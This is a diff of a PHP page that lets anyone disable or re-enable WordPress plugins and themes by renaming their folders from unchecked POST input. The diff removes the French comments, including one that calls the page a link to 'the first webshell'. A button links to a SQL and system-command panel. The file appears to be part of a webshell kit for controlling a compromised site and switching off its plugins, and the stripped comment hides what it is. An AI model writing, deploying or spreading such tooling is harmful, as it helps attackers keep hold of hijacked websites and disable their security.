@@ -1,19 +1,16 @@
 <?php
-// Chemins vers les répertoires des plugins et thèmes WordPress
+
 $plugins_path = './wp-content/plugins/';
 $themes_path = './wp-content/themes/';
 
-// Vérifier si un répertoire existe
 function is_directory($path) {
     return is_dir($path);
 }
 
-// Lister les dossiers de plugins ou thèmes
 function list_directories($path) {
     return array_filter(glob($path . '*'), 'is_dir');
 }
 
-// Désactiver (commenter) un plugin ou thème en ajoutant un préfixe '_'
 function disable_directory($path, $dir_name) {
     $new_name = $path . '_' . $dir_name;
     if (rename($path . $dir_name, $new_name)) {
@@ -23,7 +20,6 @@ function disable_directory($path, $dir_name) {
     }
 }
 
-// Activer (décommenter) un plugin ou thème en supprimant le préfixe '_'
 function enable_directory($path, $dir_name) {
     $new_name = $path . ltrim($dir_name, '_');
     if (rename($path . $dir_name, $new_name)) {
@@ -33,7 +29,6 @@ function enable_directory($path, $dir_name) {
     }
 }
 
-// Désactiver ou activer les plugins/thèmes en fonction des actions soumises
 if (isset($_POST['disable_plugin'])) {
     disable_directory($plugins_path, $_POST['plugin_name']);
 }
@@ -117,7 +112,6 @@ if (isset($_POST['enable_theme'])) {
     <table>
         <tr><th>Plugin</th><th>Action</th></tr>
         <?php
-        // Lister les plugins
         $plugins = list_directories($plugins_path);
         foreach ($plugins as $plugin) {
             $plugin_name = basename($plugin);
@@ -141,7 +135,6 @@ if (isset($_POST['enable_theme'])) {
     <table>
         <tr><th>Thème</th><th>Action</th></tr>
         <?php
-        // Lister les thèmes
         $themes = list_directories($themes_path);
         foreach ($themes as $theme) {
             $theme_name = basename($theme);
@@ -160,8 +153,6 @@ if (isset($_POST['enable_theme'])) {
         }
         ?>
     </table>
-
-    <!-- Lien vers le premier webshell -->
     <form action="/" method="get">
         <button type="submit" class="button">Gérer SQL et cmd sys</button>
     </form>
